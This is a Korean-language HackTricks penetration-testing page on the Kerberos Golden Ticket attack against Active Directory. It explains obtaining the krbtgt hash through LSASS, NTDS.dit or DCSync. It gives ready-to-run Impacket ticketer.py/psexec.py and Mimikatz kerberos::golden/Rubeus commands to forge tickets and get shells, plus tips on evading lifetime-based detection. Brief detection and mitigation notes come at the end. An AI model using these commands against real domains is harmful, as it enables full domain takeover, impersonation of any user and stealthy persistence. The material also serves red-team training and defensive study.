# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** 공격은 **Active Directory (AD) krbtgt 계정의 NTLM 해시를 사용하여 임의의 사용자를 가장한 합법적인 Ticket Granting Ticket (TGT)를 생성하는 것**으로 구성됩니다. 이 기술은 **가장한 사용자로서 도메인 내의 모든 서비스나 머신에 접근할 수 있게 해주기 때문에** 특히 유리합니다. **krbtgt 계정의 자격 증명은 자동으로 업데이트되지 않는다는 점을 기억하는 것이 중요합니다.**

krbtgt 계정의 **NTLM 해시를 획득하기 위해** 다양한 방법을 사용할 수 있습니다. 이는 도메인 내의 모든 도메인 컨트롤러(DC)에 위치한 **Local Security Authority Subsystem Service (LSASS) 프로세스** 또는 **NT Directory Services (NTDS.dit) 파일**에서 추출할 수 있습니다. 또한, **DCsync 공격을 실행하는 것**도 이 NTLM 해시를 얻기 위한 또 다른 전략으로, Mimikatz의 **lsadump::dcsync 모듈**이나 Impacket의 **secretsdump.py 스크립트**와 같은 도구를 사용하여 수행할 수 있습니다. 이러한 작업을 수행하기 위해서는 **도메인 관리자 권한 또는 유사한 수준의 접근 권한이 일반적으로 필요하다는 점을 강조하는 것이 중요합니다.**

NTLM 해시는 이 목적을 위한 유효한 방법으로 사용될 수 있지만, 운영 보안상의 이유로 **Advanced Encryption Standard (AES) Kerberos 키(AES128 및 AES256)를 사용하여 티켓을 위조하는 것이 강력히 권장됩니다.**
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**한 번** **golden Ticket**이 주입되면, 공유 파일 **(C$)**에 접근할 수 있고, 서비스와 WMI를 실행할 수 있으므로 **psexec** 또는 **wmiexec**를 사용하여 셸을 얻을 수 있습니다 (winrm을 통해 셸을 얻을 수 없는 것 같습니다).

### 일반적인 탐지 우회

**golden ticket**을 탐지하는 가장 일반적인 방법은 **케르베로스 트래픽**을 검사하는 것입니다. 기본적으로 Mimikatz는 TGT를 **10년 동안 서명**하므로, 이후 TGS 요청에서 비정상적으로 보일 것입니다.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`, `/endin` 및 `/renewmax` 매개변수를 사용하여 시작 오프셋, 지속 시간 및 최대 갱신(모두 분 단위)을 제어합니다.
```
Get-DomainPolicy | select -expand KerberosPolicy
```
안타깝게도 TGT의 수명은 4769에 기록되지 않으므로 Windows 이벤트 로그에서 이 정보를 찾을 수 없습니다. 그러나 **이전 4768 없이 4769를 보는 것**은 상관관계가 있습니다. **TGT 없이 TGS를 요청하는 것은 불가능**하며, TGT가 발급된 기록이 없다면 오프라인에서 위조되었음을 추론할 수 있습니다.

이 탐지를 **우회하기 위해** 다이아몬드 티켓을 확인하세요:

{{#ref}}
diamond-ticket.md
{{#endref}}

### 완화

- 4624: 계정 로그인
- 4672: 관리자 로그인
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

수비자가 할 수 있는 다른 작은 트릭은 **민감한 사용자에 대한 4769에 경고**하는 것입니다. 예를 들어 기본 도메인 관리자 계정과 같은 경우입니다.

## 참조

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
